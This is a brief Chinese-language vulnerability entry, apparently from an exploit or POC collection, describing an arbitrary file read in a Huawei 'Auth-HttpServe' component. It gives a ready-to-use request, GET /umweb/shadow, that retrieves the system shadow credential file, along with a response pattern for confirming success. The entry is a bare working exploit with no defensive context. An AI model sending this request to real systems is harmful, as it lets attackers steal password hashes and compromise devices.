# 华为Auth-HttpServe任意文件读取

华为 ｜ 任意文件读取/写入 ｜ —
- **请求**：`GET /umweb/shadow HTTP/1.1`
- **响应特征**：200 ^(?=.*?root)(?=.*?bin).*?$